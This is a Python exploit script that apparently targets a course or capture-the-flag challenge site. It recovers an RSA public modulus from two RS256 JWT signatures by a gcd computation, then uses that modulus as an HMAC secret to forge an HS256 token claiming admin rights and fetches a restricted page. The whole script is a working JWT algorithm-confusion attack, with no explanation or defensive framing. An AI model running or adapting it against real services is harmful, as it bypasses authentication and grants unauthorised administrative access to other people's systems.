import base64, json, hashlib, hmac, time, sys, requests, gmpy2

BASE="https://confusion.is-course.ru"
DIGESTINFO_SHA256=bytes.fromhex("3031300d060960864801650304020105000420")

def b64d(x): 
    return base64.urlsafe_b64decode(x + "="*(-len(x)%4))
def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def signup(u):
    r=requests.post(BASE+"/signup", data={"username":u,"algo":"rsa256"}, allow_redirects=False, timeout=30)
    return r.cookies.get("session")

def em_from_token(tok):
    h,p,s = tok.split(".")
    si=(h+"."+p).encode()
    digest=hashlib.sha256(si).digest()
    T=DIGESTINFO_SHA256+digest
    k=len(b64d(s))
    EM=b"\x00\x01"+b"\xff"*(k-3-len(T))+b"\x00"+T
    sig=int.from_bytes(b64d(s),"big")
    return int.from_bytes(EM,"big"), sig

t1=signup("attackeruser1"); time.sleep(0.2)
t2=signup("attackeruser2")
print("tokens:", t1[:40], t2[:40], flush=True)
m1,s1=em_from_token(t1)
m2,s2=em_from_token(t2)
e=65537
print("computing u1...", flush=True); u1=gmpy2.mpz(s1)**e - m1
print("computing u2...", flush=True); u2=gmpy2.mpz(s2)**e - m2
print("gcd...", flush=True); G=gmpy2.gcd(u1,u2)
print("G bits:", G.bit_length(), flush=True)
# strip small factors
g=G
for p in [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53]:
    while g % p == 0: g//=p
print("after strip bits:", g.bit_length(), flush=True)
cands=[g]
if g.bit_length()>4096:
    # try to find a 4096-bit divisor: test if g has factor by checking g // (g >> 4096) ...
    cands.append(g)
N=None
for c in cands:
    if c.bit_length()==4096: N=c; break
if N is None:
    # attempt: N divides g; check if s1^e - m1 == 0 mod (g) obviously. Need to split; assume g = N
    N=g
print("N bits", N.bit_length(), flush=True)
ok = (pow(s1,e,int(N))==m1) and (pow(s2,e,int(N))==m2)
print("verify:", ok, flush=True)
if not ok:
    print("FAIL verify, G bits", G.bit_length()); sys.exit(1)
hsKey=format(int(N),"x").encode()
def forge(claims):
    hdr={"alg":"HS256","typ":"JWT"}
    h=b64e(json.dumps(hdr,separators=(',',':')).encode())
    p=b64e(json.dumps(claims,separators=(',',':')).encode())
    sig=hmac.new(hsKey,(h+"."+p).encode(),hashlib.sha256).digest()
    return h+"."+p+"."+b64e(sig)
t=forge({"admin":True,"username":"admin"})
r=requests.get(BASE+"/restricted", cookies={"session":t}, timeout=30)
print("STATUS", r.status_code)
print("RESULT:", r.text[:500])
